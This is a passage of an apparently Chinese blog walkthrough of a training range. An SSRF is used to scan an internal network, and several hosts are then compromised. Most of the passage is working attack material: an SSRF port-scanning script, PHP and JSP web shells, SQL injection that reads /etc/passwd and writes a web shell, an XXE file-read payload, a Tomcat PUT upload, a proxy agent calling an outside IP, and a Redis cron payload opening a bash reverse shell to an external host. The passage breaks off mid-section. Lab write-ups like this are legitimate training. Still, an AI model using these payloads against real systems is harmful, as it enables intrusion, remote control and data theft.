+</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=n>ip</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>alive_ips</span><span class=p>,</span> <span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>idx</span><span class=si>}</span><span class=s2>. </span><span class=si>{</span><span class=n>ip</span><span class=si>}</span><span class=s2>存活&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>得到以下信息，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. 192.168.100.1存活
+</span></span><span class=line><span class=cl>2. 192.168.100.21存活
+</span></span><span class=line><span class=cl>3. 192.168.100.22存活
+</span></span><span class=line><span class=cl>4. 192.168.100.23存活
+</span></span><span class=line><span class=cl>5. 192.168.100.24存活
+</span></span><span class=line><span class=cl>6. 192.168.100.25存活
+</span></span><span class=line><span class=cl>7. 192.168.100.26存活
+</span></span><span class=line><span class=cl>8. 192.168.100.27存活
+</span></span><span class=line><span class=cl>9. 192.168.100.28存活
+</span></span><span class=line><span class=cl>10. 192.168.100.29存活
+</span></span></code></pre></td></tr></table></div></div><p><code>1</code>这台机器没有，所以就是九台机器，继续扫描一下常用端口，把脚本改改</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>alive_ips</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;192.168.100.21&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;192.168.100.22&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;192.168.100.23&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;192.168.100.24&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;192.168.100.25&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;192.168.100.26&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;192.168.100.27&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;192.168.100.28&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;192.168.100.29&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://156.238.233.93:8090/&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>top_ports</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>    <span class=mi>21</span><span class=p>,</span> <span class=mi>22</span><span class=p>,</span> <span class=mi>23</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>80</span><span class=p>,</span> <span class=mi>110</span><span class=p>,</span> <span class=mi>135</span><span class=p>,</span> <span class=mi>139</span><span class=p>,</span> <span class=mi>143</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=mi>443</span><span class=p>,</span> <span class=mi>445</span><span class=p>,</span> <span class=mi>993</span><span class=p>,</span> <span class=mi>995</span><span class=p>,</span> <span class=mi>1433</span><span class=p>,</span> <span class=mi>1521</span><span class=p>,</span> <span class=mi>3306</span><span class=p>,</span> <span class=mi>3389</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=mi>5432</span><span class=p>,</span> <span class=mi>5900</span><span class=p>,</span> <span class=mi>6379</span><span class=p>,</span> <span class=mi>8000</span><span class=p>,</span> <span class=mi>8080</span><span class=p>,</span> <span class=mi>8443</span><span class=p>,</span>
+</span></span><span class=line><span class=cl><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>results</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>ip</span> <span class=ow>in</span> <span class=n>alive_ips</span><span class=o>.</span><span class=n>copy</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>port</span> <span class=ow>in</span> <span class=n>top_ports</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>target</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>ip</span><span class=si>}</span><span class=s2>:</span><span class=si>{</span><span class=n>port</span><span class=si>}</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=n>url</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=n>data</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;url&#34;</span><span class=p>:</span> <span class=sa>f</span><span class=s2>&#34;dict://</span><span class=si>{</span><span class=n>target</span><span class=si>}</span><span class=s2>/&#34;</span><span class=p>},</span>
+</span></span><span class=line><span class=cl>        <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;HTTP/1.1&#34;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] </span><span class=si>{</span><span class=n>target</span><span class=si>}</span><span class=s2> 服务存活&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>results</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] </span><span class=si>{</span><span class=n>target</span><span class=si>}</span><span class=s2> 服务不存活&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 打印最终结果</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>======= 存活服务列表 =======&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>idx</span><span class=p>,</span> <span class=n>result</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>results</span><span class=p>,</span> <span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>idx</span><span class=si>}</span><span class=s2>. </span><span class=si>{</span><span class=n>result</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>但是这个脚本探测不出来部分端口，手动一下就好了。不知道为什么会超时加载不出来</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1. 192.168.100.21:80
+</span></span><span class=line><span class=cl>2. 192.168.100.22:80
+</span></span><span class=line><span class=cl>3. 192.168.100.23:80
+</span></span><span class=line><span class=cl>4. 192.168.100.24:80
+</span></span><span class=line><span class=cl>5. 192.168.100.25:80
+</span></span><span class=line><span class=cl>6. 192.168.100.26:8080
+</span></span><span class=line><span class=cl>7. 192.168.100.27:6379
+</span></span><span class=line><span class=cl>8. 192.168.100.28:6379\80
+</span></span><span class=line><span class=cl>9. 192.168.100.29:3306
+</span></span></code></pre></td></tr></table></div></div><h2 id=19216810022rce>192.168.100.22RCE</h2><p>扫描一下发现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://192.168.100.22/shell.php?1
+</span></span><span class=line><span class=cl>http://192.168.100.22/phpinfo.php?1
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span> 
+</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>可以随便RCE了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://192.168.100.22/shell.php?cmd=ls
+</span></span><span class=line><span class=cl>http://192.168.100.22/shell.php?cmd=cat%20flag
+</span></span><span class=line><span class=cl>http://192.168.100.22/shell.php?cmd=ls%20/
+</span></span><span class=line><span class=cl>http://192.168.100.22/shell.php?cmd=cat%20/etc/hosts
+</span></span></code></pre></td></tr></table></div></div><p>可以查到hosts说明已经拿下这台机器</p><h2 id=19216810023sqli>192.168.100.23sqli</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://192.168.100.23/?id=1
+</span></span></code></pre></td></tr></table></div></div><p>我一看怎么什么都没有，往下拉就看到了</p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-111356.jpg width=1039 height=789 loading=lazy alt=1></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.23</span><span class=o>/</span><span class=err>?</span><span class=n>id</span><span class=o>=-</span><span class=mi>1</span><span class=s1>&#39;union</span><span class=si>%20s</span><span class=s1>elect%201,2,3--+</span>
+</span></span><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.23</span><span class=o>/</span><span class=err>?</span><span class=n>id</span><span class=o>=-</span><span class=mi>1</span><span class=s1>&#39;union</span><span class=si>%20s</span><span class=s1>elect%201,2,3,4--+</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.23</span><span class=o>/</span><span class=err>?</span><span class=n>id</span><span class=o>=-</span><span class=mi>1</span><span class=s1>&#39;union</span><span class=si>%20s</span><span class=s1>elect%201,2,3,load_file(&#39;</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span><span class=s1>&#39;)--+</span>
+</span></span><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.23</span><span class=o>/</span><span class=err>?</span><span class=n>id</span><span class=o>=-</span><span class=mi>1</span><span class=s1>&#39;union</span><span class=si>%20s</span><span class=s1>elect%201,2,3,load_file(&#39;</span><span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>hosts</span><span class=s1>&#39;)--+</span>
+</span></span><span class=line><span class=cl><span class=c1>##############################################</span>
+</span></span><span class=line><span class=cl>	<span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span>	<span class=n>localhost</span>
+</span></span><span class=line><span class=cl><span class=p>::</span><span class=mi>1</span>	<span class=n>localhost</span> <span class=n>ip6</span><span class=o>-</span><span class=n>localhost</span> <span class=n>ip6</span><span class=o>-</span><span class=n>loopback</span>
+</span></span><span class=line><span class=cl><span class=n>fe00</span><span class=p>::</span><span class=mi>0</span>	<span class=n>ip6</span><span class=o>-</span><span class=n>localnet</span>
+</span></span><span class=line><span class=cl><span class=n>ff00</span><span class=p>::</span><span class=mi>0</span>	<span class=n>ip6</span><span class=o>-</span><span class=n>mcastprefix</span>
+</span></span><span class=line><span class=cl><span class=n>ff02</span><span class=p>::</span><span class=mi>1</span>	<span class=n>ip6</span><span class=o>-</span><span class=n>allnodes</span>
+</span></span><span class=line><span class=cl><span class=n>ff02</span><span class=p>::</span><span class=mi>2</span>	<span class=n>ip6</span><span class=o>-</span><span class=n>allrouters</span>
+</span></span><span class=line><span class=cl><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.23</span>	<span class=mi>213</span><span class=n>c410b2987</span>
+</span></span></code></pre></td></tr></table></div></div><p>有权限，直接写个马进去</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.23</span><span class=o>/</span><span class=err>?</span><span class=n>id</span><span class=o>=-</span><span class=mi>1</span><span class=s1>&#39;union</span><span class=si>%20s</span><span class=s1>elect%201,2,3,&#39;</span><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span><span class=o>%</span><span class=mi>20</span><span class=n>system</span><span class=p>(</span><span class=o>$</span><span class=n>_GET</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span><span class=s1>&#39;</span><span class=si>%20i</span><span class=s1>nto</span><span class=si>%20o</span><span class=s1>utfile%20&#39;</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>html</span><span class=o>/</span><span class=mf>2.</span><span class=n>php</span><span class=s1>&#39;--+</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.23</span><span class=o>/</span><span class=mf>2.</span><span class=n>php</span><span class=err>?</span><span class=mi>1</span><span class=o>=</span><span class=n>ls</span>
+</span></span></code></pre></td></tr></table></div></div><p>这台机器就被拿下了</p><h2 id=19216810024rce>192.168.100.24RCE</h2><p>这里需要命令执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://192.168.100.24/
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-112050.jpg width=983 height=800 loading=lazy alt=1></p><p>很经典的截断RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://192.168.100.24/?ip=127.0.0.1;ls
+</span></span></code></pre></td></tr></table></div></div><p>发现失败了，可能是POST传参，我们刚才已经拿到shell了，所以问题不大</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://192.168.100.23/2.php?1=curl http://192.168.100.24/ -d &#39;ip=127.0.0.1;ls&#39; -X POST
+</span></span></code></pre></td></tr></table></div></div><p>但是好像没有curl这台机器上面，所以还是得用SSRF的打法，将整个数据包选中然后url二次编码(不是二重编码)拼接到gopher协议后面，其中需要注意的点，</p><ul><li><code>Accept-Encoding: gzip, deflate</code>把这行删除，不然会出现乱码，因为被两次gzip编码了，</li><li>需要抓一个正常的POST包，然后自己把<code>host</code>等类似的东西改掉，然后全选进行全编码(Convert selection->URL->URL-encode all characters )</li></ul><p>但是一直不好打，没打成功，那别怪我了，直接搭建内网代理，使用proxifier进行全局代理，来抓包就很简单了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>./linux_x64_admin -l 1234 -s 123
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>./linux_x64_agent -c 27.25.151.48:1234 -s 123 --reconnect 8
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>use 0 
+</span></span><span class=line><span class=cl>socks 5555
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-124509.jpg width=1266 height=780 loading=lazy alt=1></p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-124644.jpg width=1266 height=780 loading=lazy alt=1></p><p>成功RCE，发现能够读取<code>hosts</code>这台机器拿下，因为每个人的数据包都不一样，所以我也不放出来了</p><h2 id=19216810025xxe>192.168.100.25XXE</h2><p>用户登录用xml文档解析的直接打XXE，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE test [
+</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class=line><span class=cl>]&gt;
+</span></span><span class=line><span class=cl><span class=nt>&lt;user&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;username&gt;</span><span class=ni>&amp;xxe;</span><span class=nt>&lt;/username&gt;</span>
+</span></span><span class=line><span class=cl>    <span class=nt>&lt;password&gt;</span>123<span class=nt>&lt;/password&gt;</span>
+</span></span><span class=line><span class=cl><span class=nt>&lt;/user&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-134621.jpg width=1266 height=780 loading=lazy alt=1></p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-134700.jpg width=1266 height=780 loading=lazy alt=1></p><h2 id=19216810026tomcat8519>192.168.100.26Tomcat/8.5.19</h2><p>上传文件getshell即可，没错就是那个PUT上传文件的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>PUT</span> <span class=nn>/a.jsp/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>192.168.100.26:8080</span>
+</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
+</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>308</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt;%
+</span></span><span class=line><span class=cl>if(&#34;023&#34;.equals(request.getParameter(&#34;pwd&#34;))){
+</span></span><span class=line><span class=cl>	java.io.InputStream in =Runtime.getRuntime().exec(request.getParameter(&#34;i&#34;)).getInputStream();
+</span></span><span class=line><span class=cl>	int a = -1;
+</span></span><span class=line><span class=cl>	byte[] b = new byte[2048];
+</span></span><span class=line><span class=cl>	out.print(&#34;&lt;pre&gt;&#34;);
+</span></span><span class=line><span class=cl>	while((a=in.read(b))!=-1){
+</span></span><span class=line><span class=cl>		out.println(new String(b));
+</span></span><span class=line><span class=cl> 	}
+</span></span><span class=line><span class=cl>	out.print(&#34;&lt;/pre&gt;&#34;);
+</span></span><span class=line><span class=cl> }
+</span></span><span class=line><span class=cl>%&gt;
+</span></span></code></pre></td></tr></table></div></div><p>一样的打法，写入shell</p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-135308.jpg width=1266 height=780 loading=lazy alt=1></p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-135345.jpg width=1266 height=780 loading=lazy alt=1></p><h2 id=19216810027redis未授权>192.168.100.27redis未授权</h2><p>系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以打算定时任务弹shell</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1># 清空 key</span>
+</span></span><span class=line><span class=cl><span class=n>dict</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.27</span><span class=p>:</span><span class=mi>6379</span><span class=o>/</span><span class=n>flushall</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 设置要操作的路径为定时任务目录</span>
+</span></span><span class=line><span class=cl><span class=n>dict</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.27</span><span class=p>:</span><span class=mi>6379</span><span class=o>/</span><span class=n>config</span> <span class=n>set</span> <span class=n>dir</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>spool</span><span class=o>/</span><span class=n>cron</span><span class=o>/</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 在定时任务目录下创建 root 的定时任务文件</span>
+</span></span><span class=line><span class=cl><span class=n>dict</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.27</span><span class=p>:</span><span class=mi>6379</span><span class=o>/</span><span class=n>config</span> <span class=n>set</span> <span class=n>dbfilename</span> <span class=n>root</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 写入 Bash 反弹 shell 的 payload</span>
+</span></span><span class=line><span class=cl><span class=n>dict</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.27</span><span class=p>:</span><span class=mi>6379</span><span class=o>/</span><span class=n>set</span> <span class=n>x</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>* * * * * /bin/bash -i &gt;%26 /dev/tcp/27.25.151.48/4444 0&gt;%261</span><span class=se>\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># 保存上述操作</span>
+</span></span><span class=line><span class=cl><span class=n>dict</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168</span><span class=o>.</span><span class=mf>100.27</span><span class=p>:</span><span class=mi>6379</span><span class=o>/</span><span class=n>save</span>
+</span></span></code></pre></td></tr></table></div></div><p>一定是在bp依次运行，网页在<code>save</code>时候会卡掉，就不能成功</p><p><img src=/p/guoguang-range-ssrf-intranet-penetration/QQ20250403-140301.jpg width=465 height=159 loading=lazy alt=1></p><p>这台机器也直接拿下</p><h2 id=19216810028redis授权>192.168.100.28redis授权</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
